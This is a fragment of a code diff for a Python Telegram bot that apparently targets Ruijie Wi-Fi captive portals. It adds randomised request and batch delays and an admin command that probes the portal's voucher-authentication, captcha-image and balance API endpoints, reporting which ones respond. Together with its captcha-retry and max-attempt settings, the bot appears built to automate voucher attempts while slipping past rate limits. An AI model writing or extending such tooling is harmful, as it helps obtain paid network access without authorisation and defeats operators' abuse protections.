         f"🌐 Default Portal: {DEFAULT_PORTAL}\n"
         f"🔁 Session Recheck: {SESSION_RECHECK_INTERVAL//60}min\n"
         f"🛡️ Captcha Retry: {CAPTCHA_RETRY}\n"
-        f"🔄 Max Attempts: {MAX_ATTEMPTS}"
+        f"🔄 Max Attempts: {MAX_ATTEMPTS}\n"
+        f"⏱️ Request Delay: {REQUEST_DELAY[0]}-{REQUEST_DELAY[1]}s\n"
+        f"⏱️ Batch Delay: {BATCH_DELAY[0]}-{BATCH_DELAY[1]}s\n\n"
+        f"🛡️ **Security Enhanced Mode** ✅"
     )
 
 @bot.message_handler(commands=['testbalance'])
@@ -1266,6 +1394,53 @@ async def testbalance(message):
         )
         await bot.send_message(chat_id, result, parse_mode="Markdown")
 
+# ⭐ NEW: Discover portal endpoints
+@bot.message_handler(commands=['discover'])
+async def discover_portal(message):
+    if str(message.chat.id) != ADMIN_ID:
+        await bot.reply_to(message, "No Permission")
+        return
+
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await bot.reply_to(message, "Usage: /discover <base_url>\nExample: /discover https://portal-as.ruijienetworks.com")
+        return
+
+    base_url = args[1].rstrip('/')
+    await bot.reply_to(message, f"🔍 Discovering endpoints for {base_url}...")
+
+    endpoints = [
+        "/api/auth/voucher?lang=en_US",
+        "/api/v2/auth/voucher?lang=en_US",
+        "/api/v1/auth/voucher?lang=en_US",
+        "/portal/api/auth/voucher?lang=en_US",
+        "/api/auth/captcha/image",
+        "/api/v2/auth/captcha/image",
+        "/api/auth/balance/getBalance",
+        "/api/v2/auth/balance/getBalance",
+    ]
+
+    results = []
+    for endpoint in endpoints:
+        url = base_url + endpoint
+        try:
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+                status = resp.status
+                body = await resp.text()
+
+                if status == 200:
+                    results.append(f"✅ {endpoint} → {status}")
+                elif status == 404:
+                    results.append(f"❌ {endpoint} → {status}")
+                else:
+                    results.append(f"⚠️ {endpoint} → {status}")
+
+        except Exception as e:
+            results.append(f"💥 {endpoint} → Error: {str(e)[:50]}")
+
+    result_text = "\n".join(results)
+    await bot.reply_to(message, f"📊 Discovery Results:\n\n{result_text}")
+
 # ── Polling and main ──────────────────────────────────────────────────────
 async def start_polling():
     backoff = 5
@@ -1291,7 +1466,7 @@ async def main():
         asyncio.create_task(web_server())
         asyncio.create_task(github_update_scheduler())
         asyncio.create_task(session_recheck_scheduler())
-        log.info("🚀 Bot started successfully! Updated: 2026-10-17")
+        log.info("🚀 Bot started successfully! Updated: 2026-10-18 (Security Enhanced)")
         await start_polling()
     finally:
         await session.close()
